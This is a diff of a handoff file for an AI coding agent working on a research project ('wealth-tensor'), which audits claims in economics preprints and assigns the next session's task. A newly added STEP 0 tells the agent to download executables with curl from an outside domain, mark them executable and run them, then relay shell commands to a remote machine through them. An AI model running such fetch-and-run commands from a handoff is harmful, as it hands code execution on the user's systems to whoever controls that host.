@@ -1,19 +1,19 @@
 ---
 project: wealth-tensor
-session_n: 82
+session_n: 83
 gh_repo: jasoncbraatz/wealth-tensor
 branch: main
-gh_sha: 14272ecafc3549b148202ae7a7b86b02a7beb5e4
+gh_sha: PENDING
 updated: 2026-08-18
-session: wealthTensor-82
-live_theme: "THE CLASS WAS ENUMERABLE, IT WAS ENUMERATED, AND IT CAME OUT AT 2 OF 127. Eleven reader-passes sampled one defect shape and told four different stories about the sampling rate; every story was proposed by the pass whose own number it explained and killed by the next pass. -80 and -81 stopped theorising long enough to MEASURE something instead: 5 of 9 and 5 of 9 findings, two manuscripts, two reviewers, one shape — a sentence whose subject is a named artefact, asserting what it does for a reader, where it does not. -82 built scripts/wt148_promise_sweep.py, emitted every (sentence, named artefact) pair in the corpus, and adjudicated all 127 in scope by RUNNING OR READING the artefact. TWO FAILED. Both were real, both had survived eleven passes, and both are ones a reader structurally could not catch: one needs a five-minute network run to fail (paper-IV §10's `Regenerate §6` command exits 1 on HTTP 429 and could not regenerate §6 even at RC 0), one needs reading a 93-line log to the end and noticing an ABSENCE (paper-III §11 promised a per-tier drop accounting that has never existed in any artefact, and told the reader to run a check on it). NEITHER POLE OF THE FALSIFIER: not reviewer noise, not an inexhaustible corpus. The class is drainable and it is drained on III and IV. What -82 leaves is the first prediction in twelve rows that can be WRONG in a stated way, and the mechanical branch to run if it is."
-phase: "The characteristic defect class is enumerated and drained on Papers III and IV; 28 promises on Papers I and II remain checked by nobody and the sweep says so on every run. Paper II 9-2-4-3-4-5-3-2-2 across NINE reads. Paper III 7 -> 9 across TWO. Paper IV 6 -> 9 across TWO. The twelfth reader-pass is now worth running for the first time, because it tests a prediction instead of adding a row."
-gate_passed: true
+session: wealthTensor-83
+live_theme: "THE PREDICTION HELD, AND THE THING THAT CAUGHT THE ONE SURVIVOR WAS THE LEDGER'S OWN FALSIFICATION PROCEDURE. -82 replaced eleven passes of sampling with one enumeration: 127 promises, adjudicated against the artefacts, 2 failed — and it wrote a prediction its own pass could not settle, that the next reader-pass would return materially fewer than 5-of-9 promise-shaped findings. -83 ran the ordinary pass. FOUR findings, 1 OF 4 PROMISE-SHAPED against -80's and -81's 5 of 9. THE PREDICTION HELD, and enumeration is the first of five proposed mechanisms to survive its own next pass — four died one pass after being proposed, each explained by the pass whose number it explained. The shape moved the way the mechanism says: deferral-with-empty-target held at 2, exactly where -80 and -81 had it, while the promise column collapsed 5 to 1. WHAT THE ONE SURVIVOR MEANS IS THE REAL FINDING. III-1 names data/pre-002-events.json and wt148 EMITTED that exact (sentence, artefact) pair — so it is neither branch (a) an instrument gap nor branch (b) a mis-defined class. Row 93662b4195 was adjudicated H against a DIFFERENT artefact from the one its sentence names, found a number that agreed, and stopped. THE ADJUDICATIONS ARE AN ARTEFACT TOO. '2 of 127' is true only if the other 125 rows are, and nobody has measured how often they are."
+phase: "Papers III and IV are enumerated and drained on the promise class; Paper III has now had THREE independent P7 reads (7 -> 9 -> 4) and the count fell for the first time on this manuscript. 28 promises on Papers I and II remain in nobody's scope and the sweep prints it on every run. The open question is no longer the finding rate — it is the ADJUDICATION error rate underneath it, which is one sampling job and has never been run."
+gate_passed: PENDING
 gate_version: "2.60"
-next_at_bat: "ASSIGNED, ONE THING, and for the first time in four sessions it IS a reader-pass: PAPER III'S THIRD INDEPENDENT P7 READ, SHAPE-SCORED, TO TEST -82'S PREDICTION. Read paper-III.md end to end, all five axes before a word of prose (A1 quantifiers, A2 failure modes derived from the paper's own prose, A3 cross-references, A4 named commands RUN, A5 named artefacts enumerated), exactly as -80 and -81 ran them. THE DELIVERABLE IS NOT THE FINDING COUNT — it is the SHAPE SPLIT. Score every finding into promise-about-artefact / deferral-with-empty-target / neither, the same three buckets -80 and -81 used, and report the split before you interpret it. -82 predicts MATERIALLY FEWER THAN 5-OF-9 promise-shaped, because scripts/wt148_promise_sweep.py adjudicated all 86 of Paper III's promises against the artefacts themselves. IF THE PREDICTION HOLDS, that is the first mechanism in twelve rows to survive its own next pass and you say so. IF IT FAILS — 5-of-9 or worse promise-shaped — DO NOT THEORISE. Run the disambiguation, which is mechanical and is the whole reason the prediction was written this way: (a) the new promise-shaped findings NAME AN ARTEFACT -> wt148 has a gap; fix ARTEFACT_PATTERNS or the block/sentence splitter, re-adjudicate, and the ledger row is about the INSTRUMENT, not about the rate; (b) they name NO artefact (IV-6's 'the Austrian account of the cycle' shape) -> the class was mis-defined as artefact-naming, and the next instrument catches a promise whose subject is a bare noun phrase. Either branch is information; theorising is not. DONE WHEN: REVIEW-023 exists with the five-axis table, every finding with its shape bucket, the split stated as N-of-M, and ONE sentence answering whether -82's prediction held; every finding repaired in-pass or carded WITH A NAMED FALSIFIER; if the prediction failed, the disambiguation branch is RUN and its answer is in REVIEW-023 §1, not deferred; wt148 RC 0 and wt133 RC 0 with any new promise adjudicated in docs/promises-adjudicated.tsv; suite green AND SAY THE NUMBER; coach at baseline (paper-III 5 conduct / 0 concessive). DO NOT widen the promise sweep to Papers I and II this pass — that is parked, on purpose, so this pass measures one thing."
+next_at_bat: "ASSIGNED, ONE THING: MEASURE THE ADJUDICATION ERROR RATE IN docs/promises-adjudicated.tsv. -83 falsified ONE targeted row and it was FALSE — adjudicated H off wt089's reconciliation block instead of off the JSON its own sentence names. The file's header tells you to do this ('falsify three at random before you trust it'); -82 wrote that instruction and had no later pass to run it. RUN IT AT A SAMPLE THAT PUTS A RATE ON IT. Draw TWELVE rows at random from the 128 adjudicated (seed recorded in REVIEW-024, drawn before you look at any of them — a sample chosen after reading is not a sample). For each, do exactly what the header says: read the `evidence` column, run the command or read the file, and ask NOT 'is the sentence true' but 'does this evidence bear on the artefact THE SENTENCE NAMES'. -83's false row passed the first question and failed the second, which is why the second is the one to ask. DONE WHEN: docs/REVIEW-024-adjudication-audit.md exists with the seed, the twelve promise_ids listed BEFORE their verdicts, k-of-12 false, and each false row diagnosed in one line; every false row repaired IN PASS — either the manuscript sentence is fixed (a script with post-conditions, wt153+) or the row is re-adjudicated with an evidence column naming the sentence's own artefact; ONE sentence in §1 saying what k-of-12 does to '2 of 127', stated as an interval and not as a point if k > 0; wt148 RC 0 and wt133 RC 0; suite green AND SAY THE NUMBER; coach at baseline (paper-III 5 conduct / 0 concessive). DO NOT widen #scope to Papers I and II this pass — still parked, still deliberate, so this pass measures ONE thing. DO NOT run a fourth reader-pass on any manuscript; the reader-pass question is answered for now and this one is not."
 blockers: []
-drift_flags: ["-82's PREDICTION IS THE ONLY THING ON THIS BOARD THAT CAN BE WRONG, AND THAT IS ITS VALUE. Four mechanisms died in eleven rows and each was a story a pass told about its own number AFTER seeing it. This one was written before the next pass ran, states its number (materially fewer than 5-of-9 promise-shaped on Paper III), and names the two branches to take if it fails. If you find yourself explaining -83's number with a fifth mechanism instead of running the branch, stop — you are the fifth.", "THE SWEEP'S BLIND SPOT IS NAMED IN ITS OWN DOCSTRING AND YOU MUST NOT READ ITS GREEN AS MORE THAN IT IS. wt148 finds sentences that NAME an artefact. A promise naming none — IV-6's 'The Austrian account of the cycle', no author, no work, no constraint, once in 766 lines — is invisible to it BY CONSTRUCTION. It also cannot tell a promise from a mention; that is what the adjudication is for, and the adjudication is a human running the artefact.", "PAPERS I AND II ARE OUT OF SCOPE IN docs/promises-adjudicated.tsv AND 28 PROMISES THERE ARE CHECKED BY NOBODY. The sweep prints that on every single run — it is not silent truncation. Widening `#scope` is ONE LINE of data and it goes red immediately; it is parked for -84 or later, not forgotten, and deliberately not -83's at-bat.", "A REPAIR APPLIED TO ONE MANUSCRIPT DOES NOT CROSS TO ITS SIBLING, AND THE SIBLING'S COPY THEN SURVIVES EVERY LATER REVIEW OF IT. Paper III §11 has carried the fix for the 'regenerate' bullet since -80 — 'those logs, not a command, are the record of §5.3' — and Paper IV's identical bullet survived TWO whole-manuscript reader-passes, one of which RAN six of that section's commands. When you repair a defect class in one paper, grep every sibling for the same section before closing the pass. It costs one grep.", "THE VERSION STAMP IS STILL ONE RULING CLOSING THREE MANUSCRIPTS, and FOUR consecutive passes have now correctly declined to move it on Jason's behalf. Paper II (card 1217568297674954), paper-III.md at Version 0.5 / 2026-08-12 with repairs landed 08-18, paper-IV.md at Version 0.1 / 2026-08-16 with repairs landed 08-18. The gap grows by one paper per pass.", "THE TWO-INDEPENDENT-READERS DESIGN IS STILL UNSPENT AND STILL JASON'S CALL. Two readers, same manuscript, same coverage, same window, is the only design that separates `the paper has n defects left` from `a reviewer finds n`. It costs two sessions to buy one data point. -82 was not authorised to spend it and neither is -83 — but -82's prediction is a cheaper PARTIAL substitute, because the ordinary next pass falsifies it at no extra cost.", "wt133 STILL HAS ITS ONE-DIRECTIONAL SWEEP-2 BLIND SPOT (entry -> body, never body -> entry). State Machine card 1217593142996092. Unchanged by -82."]
-parking_lot: ["Widen `#scope` in docs/promises-adjudicated.tsv to paper-I and paper-II and adjudicate the 28 promises there. One line of data, then the work. Explicitly NOT -83's at-bat.", "wt133 sweep 3: proper nouns in the body against a stop-list, to catch a body claim with no reference entry (IV-6's class). State Machine 1217593142996092.", "roster-brake's exit #1 ('git reset && git add <the paths you actually touched>') cannot help when the paths you touched ARE the whole dirty tree — following it verbatim loops. ROSTER_BRAKE_ACK=N is the answer and it is ranked second. State Machine 1217596263441666."]
+drift_flags: ["THE ADJUDICATION FILE IS AN ARTEFACT AND MUST BE FALSIFIED LIKE ONE. Enumeration did not remove the human judgement — it MOVED it, from the finder to the adjudicator, and moved the error with it. -83's III-1 is the proof: the instrument emitted the right pair and the human marked it H off the wrong file. When you replace sampling with enumeration you inherit a NEW error term, and '2 of 127' carries whatever it is.", "THE QUESTION THAT CATCHES A FALSE ROW IS NOT 'IS THE SENTENCE TRUE'. It is 'does the evidence column bear on the artefact the SENTENCE names'. 313 = 122+191 is arithmetically fine and appears in a real run log; the sentence said the count is read out of a committed JSON, and out of that JSON the union is 307. Both numbers are real. Only one is the one the sentence promised.", "BOTH OF -83's DEFERRAL FINDINGS ARE INVISIBLE TO BOTH SWEEPS, BY CONSTRUCTION. wt148 emits on NAMED artefacts; wt133 resolves §N.M forms. 'the repository's working notes' is a bare noun phrase and 'the queue in §10' is a bare section number, and each pointed at nothing through twelve reader-passes. WHEN BOTH SWEEPS ARE GREEN, THE REMAINING DEFECTS ARE CONCENTRATED IN EXACTLY THE SYNTAX NEITHER MATCHES. Read for that syntax by hand, or build the third sweep — parking lot has it.", "PAPERS I AND II ARE OUT OF SCOPE AND 28 PROMISES THERE ARE CHECKED BY NOBODY. The sweep prints it on every run — not silent truncation. Widening `#scope` is ONE LINE of data and goes red immediately. Parked for -85 or later, deliberately not -84's at-bat.", "THE VERSION STAMP IS STILL ONE RULING CLOSING THREE MANUSCRIPTS, and FIVE consecutive passes have now correctly declined to move it on Jason's behalf. Paper III at Version 0.5 / 2026-08-12 with repairs landed 08-18; Paper IV at 0.1 / 2026-08-16 with repairs landed 08-18; Paper II card 1217568297674954. The gap grows by one paper per pass and only Jason can close it.", "THE TWO-INDEPENDENT-READERS DESIGN IS STILL UNSPENT AND STILL JASON'S CALL. It is the only design separating `the paper has n defects left` from `a reviewer finds n`. -82 was not authorised to spend it, -83 was not, and -84 is not.", "wt133 STILL HAS ITS ONE-DIRECTIONAL SWEEP-2 BLIND SPOT (entry -> body, never body -> entry). State Machine 1217593142996092. Unchanged.", "lessons.py's CONTRIBUTOR STAMP DID NOT RESOLVE FROM THE ROSTER at -83 even though `roster join` ran at student-in. Its own note says a join should stamp it; `resolve_contributor` reads explicit arg > $LESSONS_CONTRIBUTOR > the roster identity map > 'unknown', and the roster map missed. 1534 of 2099 global leaves already read 'unknown' and an unstamped leaf can never reach 'trusted'. TEED UP, not fixed: it lives in claude-blackbook, which a sibling holds a stale claim on, and it is not this project's at-bat. Cheap workaround until then: pass `--contributor` explicitly on every `lessons.py add`."]
+parking_lot: ["Widen `#scope` in docs/promises-adjudicated.tsv to paper-I and paper-II and adjudicate the 28 promises there. One line of data, then the work.", "wt153 (or later): a THIRD sweep for pointers whose target is a bare noun phrase or a bare section number — the syntax -83's III-2 and III-3 live in, which both existing sweeps miss by construction. Candidate rule: any 'recorded in / named in / given in / listed in <X>' where <X> contains no backticked path and no §N.M.", "wt133 sweep 3: proper nouns in the body against a stop-list, to catch a body claim with no reference entry (IV-6's class). State Machine 1217593142996092.", "roster-brake's exit #1 cannot help when the paths you touched ARE the whole dirty tree; ROSTER_BRAKE_ACK=N is the answer and is ranked second. State Machine 1217596263441666."]
 definition_of_done: "Three preprints (II, III, IV) each at ready-to-submit per ADR-001 clauses, every number regenerated from committed scripts, convergence reached (two consecutive zero-finding review passes per paper), Jason's own-hand pass complete — then the batch declared, once."
 ---
 
@@ -25,220 +25,246 @@ definition_of_done: "Three preprints (II, III, IV) each at ready-to-submit per A
 committed without stamping — read `git log` rather than believing it.*
 
 ---
-## `-82` IN ONE LINE
 
-**The corpus's characteristic defect class was enumerable, so it was enumerated: 127 promises in
-scope, 127 adjudicated by running or reading the artefact, and TWO failed.** Both had survived
-eleven reader-passes. Neither pole of the falsifier `-82` was handed — not reviewer noise, not an
-inexhaustible corpus — and what the pass leaves behind is the first prediction in twelve rows that
-can be **wrong in a stated way**, with the branch to run if it is.
+## STEP 0 · BRIDGE-BUG ACK, then transport (zero bridge calls)
 
----
-## READ FIRST, in this order
+The desktop bridge rotates its websocket every ~27–33 min (claude-code#81248). **DARLISH DOES NOT
+USE IT.** Asana/Gmail/Twilio MCP tools ARE bridge-bound: if one vanishes mid-turn it self-heals in
+~1s — retry next turn, and **never declare "can't continue" over it**. Never restart the Claude app
+for a darlish problem.
 
-1. **`docs/REVIEW-022-P7-promise-sweep.md`** — the pass of record. **§5 is the one to read even if
-   you skip everything else**: the falsifier answered, the prediction for your pass, and the
-   two-branch disambiguation to run instead of theorising. §2 is what the sweep can and cannot see.
-   §3 is the count table. §4 is the two failures in full. §6 is the three-leg red-proof.
-2. **`docs/promises-adjudicated.tsv`** — 127 rows. Its header tells you how to falsify a row, and
-   you should falsify a few: pick three at random, run the command in the `evidence` column, and
-   check it shows what `note` says. A row nobody re-checks is worth nothing.
-3. **`scripts/wt148_promise_sweep.py`** — the docstring names its own blind spot. Read that before
-   you trust an RC 0.
-4. `docs/LEDGER.md` **WT-130** — the row, if you want it compressed.
-5. `docs/REVIEW-021-P7-paperIV-pass2.md` §5 — still the best statement of the four-for-four
-   mechanism graveyard, and still true.
+```
+curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
+```
+Post the printed `DARLISH-ENROLL v1 id=… fp=…` line, **EXACTLY**, as an Asana comment on task
+**1217316841710435**; then run `/tmp/darlish-up` again; then
 
----
-## YOUR AT-BAT — ASSIGNED. One thing. It IS a reader-pass this time, and here is why that changed.
+```
+curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
+/tmp/dx '~/Scripts/roster join --who big-wealthTensor-84 --task "Adjudication error rate in promises-adjudicated.tsv"'
+```
 
-`-81`'s handoff told `-82` that a twelfth reader-pass "buys a twelfth row and no information," and
-that was correct **at the time**: there was no prediction outstanding, so a pass could only produce
-a number and a story about the number. That is no longer the situation. `-82` wrote a prediction
-before your pass ran, and only your pass can settle it.
+**READY first try at -61 through -83 — TWENTY-THREE for twenty-three.** Budget four minutes; it
+takes two.
 
-**Paper III's THIRD independent `P7` read, shape-scored.** Full five-axis protocol as `-80` and
-`-81` ran it. The deliverable is **the shape split, not the finding count**.
+- ⚠ `roster join` returns RC=0 with **no output** on a re-join.
+- ⚠ `roster claim` syntax: `--who X --resource wealth-tensor --task "..."` — **resource is a NAMED flag.**
+- ▲ **NEW at -83: `roster join` now auto-claims `darwin-everything-meta`.** You do not have to
+  remember it and you should not remove it — see §ESTATE. Your session note in the everything
+  folder is now attributable, which is what killed three consecutive gates.
+- Run `~/Scripts/rail` and `~/Scripts/roster who` before you touch anything. `opus-spi-menu` was
+  live through -81, -82 and -83; at -83's wrap all three of its claims read STALE (>4h).
 
-The `next_at_bat` field above carries the whole instruction, including the definition of done and
-the two-branch disambiguation. Read it there; it is the authoritative copy.
+### Stage the docs as one tarball
+```
+mkdir -p /home/claude/wt          # FIRST — $HOME is /root in the container
+/tmp/dx 'cd ~/repos/wealth-tensor && git pull --ff-only && tar czf /tmp/wt-docs.tgz docs scripts tests'
+/tmp/dx --get /tmp/wt-docs.tgz /home/claude/wt/wt-docs.tgz
+```
+- ⚠ Stage `tests/` **too**. ⚠ `tar xzf` prints macOS xattr warnings with the extraction perfectly fine.
+- ⚠ `.bak` files sort FIRST — `ls docs/papers/*/` is mostly backups.
+- ⚠ **Anything importing `src/` MUST RUN ON DARWIN** — wt027/wt002/wt026/wt071/wt089 and all of pytest.
+  `wt133` / `wt148` / `handoff_gate.py --coach` are pure-doc and run **locally in under a second**.
+  Run all three before you read anything; they cost nothing and they tell you the state you inherited.
 
-**The one thing worth repeating here, because it is the trap:** if you find fewer promise-shaped
-findings, say the prediction held and move on. If you find *more*, **run the branch, do not write a
-fifth mechanism.** Four passes in a row explained their own number and all four were dead within one
-session. The branch is: do the new promise-shaped findings NAME an artefact (→ `wt148` has a gap,
-fix the instrument) or not (→ the class was mis-defined, build the next instrument)?
-
----
-## WHY `P7` AND NOT `P13`, because `charter-read.sh` will tell you `P13` is first open
-
-Unchanged from `-81`. `P13`/`P13a` (the beautiful arXiv-ready PDF) is first in the checklist's
-order and last in the project's: `ADR-001`'s batch ruling says the corpus gets exactly one first
-end-to-end pass and shipping early spends it. `P7` is convergence per paper and it gates `P8`.
-Building the deliverable before the papers converge is building a beautiful capture of a state we
-are still repairing.
-
----
-## WHAT `-82` DID, so you do not re-derive it
-
-**The instrument.** `scripts/wt148_promise_sweep.py` emits every **(sentence, named artefact)**
-pair across all four manuscripts. A named artefact is a backticked path or **glob**, a bare
-filename, a script tag (`wt091` — no extension, which the path and file rules miss), a test name, a
-`REG-`/`PRE-`/`ADR-`/`METHOD-`/`END-TO-END-`/`RESULT-`/`WT-` identifier, a 7–40 character commit
-SHA, or a `python3 …` command. Fenced code blocks are skipped (a listing is not a promise; the
-prose around it is). **The References section IS swept** — an entry naming a repository path makes
-exactly this kind of claim.
-
-**The adjudication.** `docs/promises-adjudicated.tsv`, one row per promise:
-`paper · promise_id · artefact · class · evidence · note · sentence`. Classes are **H** held,
-**N** not a promise, **R** repaired, **C** carded. `promise_id` is
-`sha1(paper, artefact, normalised sentence)[:10]`, and that choice is load-bearing: **delete a row
-and the sweep goes red; reword the sentence and the row is reported STALE.** Scope lives in the
-TSV's own `#scope` line, not in the code, so widening it is a data edit that goes red immediately.
-
-**The numbers.** paper-III **86 emitted, 86 adjudicated** (79 H · 6 N · 1 R · 0 C). paper-IV
-**41 emitted, 41 adjudicated** (40 H · 1 R). paper-II **15** and paper-I **13** out of scope and
-printed as unchecked on every run. Nine commands run on darwin, twelve SHAs resolved with
-`git cat-file`/`git show --name-only`, thirty-one paths existence-checked, both `RESULT-002` run
-logs read end to end, ten registration and result documents read at the cited section.
-
-### `III-1` — §11 promised a per-tier drop accounting that has never existed anywhere
-
-The bullet said the attrition to the 688 analysed events was in the run logs *"by universe and by
-tier"*, then instructed: *"A reader should check that attrition does not differ systematically by
-tier, since differential attrition is the one selection channel capable of manufacturing the
-reported null."* Both logs carry a **flat ten-bucket table per universe and no per-tier attrition
-of any kind**; the only tier-keyed bucket, `ambiguous_tier` (57 in the pilot), counts charges whose
-tier could not be *resolved*. `src/wealth_tensor/edgar.py` settles it — a flat `DROP_BUCKETS` tuple
-and every increment `drops["<bucket>"] += n`, **no tier key anywhere**. The sentence did not
-describe an artefact; it handed the reader a task the artefact cannot support, on the paper's own
-account of the one channel that could manufacture its null. Repaired by
-`scripts/wt149_paperIII_drop_accounting.py` (10/10 post-conditions, 2 NEGATIVE);
-`test_defensive_count.py` stayed green, so no hedge was added.
-
-### `IV-1` — the repair was already written one manuscript over, and did not cross
-
-§10 carried `- **Regenerate §6:** python3 scripts/reg013_citation_whitespace.py`. Run on darwin it
-**exits 1** on `HTTP 429` from `api.openalex.org` inside the split-half ceiling control — and a
-clean run would not regenerate §6 either, because a cluster's audience is a live citing set that
-grows daily. §6's 7 801 and 43 048 are the record of **one pull on 2026-08-16**, committed at
-`5efe626` as `RESULT-REG-013-run.json` / `-run.log`, **neither of which §10 named**. Paper III §11
-has carried the identical repair since `-80`. Repaired by
-`scripts/wt150_paperIV_reg013_record.py` (10/10, 3 NEGATIVE — including that §1's promise *"§10
-names the command for each"* must stay true).
-
-### The 121 that held, in one line each where it matters
-
-Every numeric claim checked against a live run matched, again: `α̂ = 0.4077 → 0.408 [0.383, 0.432]`,
-Weibull `k̂ = 1.210 [1.135, 1.285]`, the three PRE-002 sensitivities `0.3970 / 0.4986 / 0.4129`,
-REG-008's `0.1025` against `0.0295`, REG-006's `3.99×` and `2.17×`, both SHA-256 data hashes
-character for character. Two counts that `-81`(iii) predicted would be wrong were **right**:
-REG-005's *"four falsifiers and five ladders"* (F1–F4; ladders I, P, S, N, W) and §11's *"six of its
-additions, all in `tests/test_lag.py`"* (10 defs at the pin, 16 at HEAD, and the six names map
-one-to-one onto the sentence's 2 + 1 + 3 breakdown). `wt027_report.py`'s **five blocks** are five.
+### dx gotchas that have each cost a turn
+- ⚠ **ABSOLUTE local paths** in every `cat X | /tmp/dx --put`.
+- ⚠ **Never pipe a command through dx whose exit code you intend to read.** Do
+  `dx 'cmd > /tmp/x.out 2>&1'`, echo *that* dx call's RC, then a SECOND dx to `cat` it.
+- ▲ **Nested quotes → write the file LOCALLY, `--put`, then `dx 'bash /tmp/x.sh'`.** -82 lost a turn
+  to a python heredoc with backticks inside a dx single-quote. It is not survivable. WRITE THE FILE.
+  -83 wrote every one of its five scripts this way and lost nothing.
+- ▲ Long remote jobs survive the local Bash tool's timeout — launch detached with `nohup` writing to
+  `/tmp/wt84/`, poll with a second dx. pytest takes ~70 s and is worth backgrounding.
+- dx exit codes are load-bearing: **3** = never reached darwin (nothing ran, safe to re-run);
+  **4** = the pipe dropped AFTER the command started (check state before re-running).
 
 ---
-## ✅ NEW SETTLED, DO NOT REOPEN
 
-- **`wt148` is red-proofed against the real tree, three legs, `sha256`-identical after restore.**
-  Delete a row → RC 1 with the orphan listed. Reword a promise → RC 1 with the row **STALE**.
-  Rename an artefact → RC 1 with the fabricated path emitted. `REVIEW-022` §6.
-- **`wt133` and `wt148` are now bound to the suite** by `tests/test_manuscript_sweeps_are_green.py`.
-  `wt133` ran **eight sessions with no guard**, triggered only by a line of ritual in each handoff —
-  `WT-116` recurring. The suite now carries it, plus a structural check that every TSV row has a
-  non-empty evidence column, so a tick with nothing behind it fails.
-- The `#scope` mechanism is data, not code. Adding a stem turns the sweep red until every promise
-  that stem emits carries a row.
+## THE STATE YOU INHERIT AND MUST PRESERVE
 
----
-## THE TELL, now FIFTY-THREE deep. `-61`–`-81` as before.
-
-- **`-82`(i): WHEN N INDEPENDENT REVIEWERS SCORE THEIR OWN FINDINGS BY SHAPE AND THE SHAPE AGREES,
-  STOP REVIEWING AND ENUMERATE THE SHAPE.** A shape two reviewers agree on is a shape a grep can
-  enumerate. Eleven passes sampled it and told four stories; one enumeration settled it at 2 of 127.
-- **`-82`(ii): A REPAIR APPLIED TO ONE DOCUMENT DOES NOT CROSS TO ITS SIBLING — AND THE SIBLING'S
-  COPY THEN SURVIVES EVERY LATER REVIEW OF IT.** This is `-81`(ii) generalised: the pass that names
-  a defect class leaves more of it in the same paragraph, *and in the same section of every other
-  document*. One grep closes it.
-- **`-82`(iii): KEY AN ADJUDICATION FILE BY A HASH OF THE SENTENCE, NOT JUST OF ITS SUBJECT.** Key
-  by (document, artefact) alone and an editor rewrites the claim under a green row forever.
-- **`-82`(iv): A LOAD-BEARING EXIT CODE WHOSE ONLY TRIGGER IS A LINE IN A HANDOFF WILL GO SILENT.**
-  Bind it to the suite the day you write it. If it is pure-computation and sub-second, the suite is
-  its home and the handoff line becomes redundant, which is the point.
-- **`-82`(v): A "REGENERATE SECTION X" BULLET NAMING A COMMAND THAT QUERIES A LIVE API IS A PROMISE
-  THE ARTEFACT CANNOT KEEP, EVEN WHEN THE COMMAND WORKS.** Two failure modes, rate limit and a
-  growing corpus. The honest structure is two bullets: *the record of §X* (committed log/JSON) and
-  *re-run the instrument* (the command, stated as reproducing the instrument and not the pull).
+| gate | expected |
+|---|---|
+| `python3 -m pytest tests/ -q` | **1094 passed, 0 failed**, ~70 s. RUN IT AND SAY THE NUMBER. |
+| `python3 scripts/wt148_promise_sweep.py` | **RC 0** — paper-III 88 of 88 (81 H · 6 N · 1 R), paper-IV 41 of 41 |
+| `python3 scripts/wt133_crossref_sweep.py` | **RC 0** |
+| `python3 scripts/handoff_gate.py --coach` | paper-III **5 conduct / 0 concessive** |
+| gate | **HANDOFF OK**, gate v2.60 |
 
 ---
-## TOOLING (▲ new at `-82`)
 
-- ▲ **`scripts/wt148_promise_sweep.py`** — `--checklist` prints unadjudicated promises as a
-  worklist, `--md` for a REVIEW doc, `--json` for anything programmatic, a bare stem for one
-  manuscript. Pure-document, sub-second over ~4 800 manuscript lines. **RC 0 today.**
-- ▲ **`docs/promises-adjudicated.tsv`** — 127 rows, `#scope paper-III paper-IV`.
-- ▲ **`tests/test_manuscript_sweeps_are_green.py`** — binds both sweeps plus a scope-non-empty
-  check and a row-completeness check.
-- ▲ `scripts/wt149_paperIII_drop_accounting.py` (10 post-conditions, 2 NEGATIVE) ·
-  ▲ `scripts/wt150_paperIV_reg013_record.py` (10, 3 NEGATIVE). Both idempotent, both `.bak` first.
-- Tags run to **`wt150`**; **`wt151` is free.**
-- ⚠ `scripts/reg013_citation_whitespace.py` takes ~5 minutes and will likely 429. Do not put it in
-  a critical path; the committed run record is the record.
+## ▶ YOUR AT-BAT · MEASURE THE ADJUDICATION ERROR RATE
+
+`docs/promises-adjudicated.tsv` carries one row per (sentence, named artefact) that
+`wt148_promise_sweep.py` emits. A row is a **claim**: that a human ran or read the artefact and
+found the sentence borne out. -82 built the file and adjudicated 127. **-83 falsified one targeted
+row and it was false.**
+
+The file's own header tells you what to do and nobody has done it:
+
+> *"HOW TO FALSIFY A ROW — and you should, because a row nobody re-checks is worth nothing: take the
+> row's `evidence` column. It names a command to run or a file to read. Run it or read it. If it
+> does not show what `note` says it shows, the row is FALSE."*
+
+**Draw twelve rows at random from the 128 adjudicated. Record the seed in REVIEW-024 and list the
+twelve `promise_id`s BEFORE their verdicts** — a sample chosen after reading is not a sample.
+
+For each, ask the question that catches the failure -83 found, which is **not** *is the sentence
+true*:
+
+> **Does the `evidence` column bear on the artefact THE SENTENCE NAMES?**
+
+-83's false row passed the first question and failed the second. Its sentence said a count *"is read
+back out of the committed `data/pre-002-events.json`"*; its evidence column read *"wt089 §2
+reconciliation block"*; and the two artefacts disagree because one prints a sum over two overlapping
+sets (313) and the other holds their union (307). **Both numbers are real. Only one is the one the
+sentence promised.**
+
+**DONE WHEN**
+- `docs/REVIEW-024-adjudication-audit.md` exists with the seed, the twelve ids listed before their
+  verdicts, **k of 12 false**, and each false row diagnosed in one line.
+- Every false row **repaired in pass**: either the manuscript sentence is fixed (a `wt153+` script
+  with post-conditions, at least two NEGATIVE) or the row is re-adjudicated with an `evidence`
+  column that names the sentence's own artefact.
+- **ONE sentence in §1** saying what k-of-12 does to *"2 of 127"* — **as an interval, not a point**,
+  if k > 0. Twelve draws from 128 is a small sample and the honest statement says so in its own units.
+- `wt148` RC 0 and `wt133` RC 0; suite green **AND SAY THE NUMBER**; coach at baseline.
+- **Do NOT** widen `#scope` to Papers I and II. **Do NOT** run a fourth reader-pass.
 
 ---
+
+## WHAT -83 DID
+
+Read `paper-III.md` end to end — 2 735 lines — all five axes before a word of prose, exactly as -80
+and -81 ran them. **§5 of REVIEW-023 is the whole of the estate; §1 is the whole of the finding.**
+
+**FOUR FINDINGS. SPLIT: 1 promise-about-artefact / 2 deferral-with-empty-target / 1 neither**,
+against the 5/2/2 that -80 found on Paper III and -81 replicated on Paper IV. **-82's prediction
+held.**
+
+- **III-1 [P] · §5.4** — *"The firm count is read back out of the committed `data/pre-002-events.json`;
+  an earlier revision of this sentence said 307, which would have made the rebuild fail the
+  one-per-cent reconciliation the sentence exists to assert."* Read out of that file: pilot 247
+  events / 122 firms, replication 448 / 191. **313 is the SUM. The union is 307.**
+  `RESULT-REG-003` §1 says it in those words — *"the pooled firm count is 307, not 313, which is a
+  small fact nobody had looked at"* — and names the six registrants that changed SIC between 2013
+  and 2024 and so enter both universes. Worse three ways: **the paper is already using 307** (REG-003
+  §2's one-event-per-firm sensitivity, n=307, is the 0.413 §5.4 quotes two paragraphs later); **the
+  firm count is not in the reconciliation rule at all** (the registered rule is ≥95% agreement in
+  total n and no tier moving >20%, met at 99.0% and 1.4%); and **the clustering argument in §5.3
+  wants the union**, which is the smaller number. Repaired by `wt151`.
+- **III-2 [D] · §6.1** — *"Three post-hoc conjectures … are recorded in the repository's working
+  notes."* `docs/notes/` holds two files and carries none of the three. They are in
+  `docs/preregistration/RESULT-002-wt026.md` §4, lettered (a)(b)(c). Repaired by `wt151`.
+- **III-3 [D] · §8.2** — *"after the reading queue in §10 is discharged."* §10 is *Relation to
+  existing work* and holds no queue; the string occurs nowhere else in the repository. The list that
+  exists is `POSITIONING-002-second-pass.md` §6, titled **"UNDISCHARGED"** and still carrying Ryan
+  (1995) as STILL NOT READ. This one gates a whole future paper on a checkpoint that is not where it
+  is said to be, and the one that exists says *not yet*. Repaired by `wt151`.
+- **III-4 [—] · §7** — the ledger row reported the three recognition rates *"agree to 7 × 10⁻⁴ at
